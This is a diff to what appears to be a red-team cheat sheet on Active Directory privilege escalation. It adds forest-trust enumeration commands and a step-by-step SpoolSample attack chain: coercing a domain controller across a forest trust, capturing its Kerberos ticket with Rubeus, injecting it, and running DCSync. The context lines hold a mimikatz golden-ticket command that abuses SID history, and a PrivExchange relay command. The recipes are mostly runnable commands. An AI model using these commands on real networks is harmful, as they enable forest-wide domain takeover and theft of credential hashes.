@@ -172,9 +172,20 @@ PrivEsc
     python privexchange.py -ah <ntlmrelay-url-path> <fqdn.exch-server> -u <domain_user_name> -d <fqdn.domain-name>
     
   Multi-Domain (Forrest) compromise usiing Sid History
+    Trust Commands
+      nltest /domain_trusts (view domain trusts)
+      Get-DomainTrust (view domain trust permissions)
     SID History
       https://adsecurity.org/?p=1640
       mimikatz kerberos::golden </admin:Administrator|/user:DC_compname$> /domain:domain.fqdn /sid:current_domain_sid /sids:parent_domain_Sid..-519 /krbtgt:krbtgt_hash /startoffset:0 /endin:600 /renewmax:10080 /ptt
+    Spool Sample
+        https://www.youtube.com/watch?v=NNoQGA9G7BU
+        https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/
+        SpoolSample_v4.5_x64.exe DC01.forrestA DC02.forrestB (forrest A is the target domain)
+        Rubeus monitor /interval:5 /filteruser:DC01$
+          - Copy Kerberose ticket and put into single line. Verify ticket with Rubeus describe /ticket:5hsR4s....
+        Rubeus ptt /ticket:5hsR4s.... (This injects the ticket into the LSA)
+        DCSync DC01.forrestA
     Trust Tickets
         https://adsecurity.org/?p=1588
         https://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/
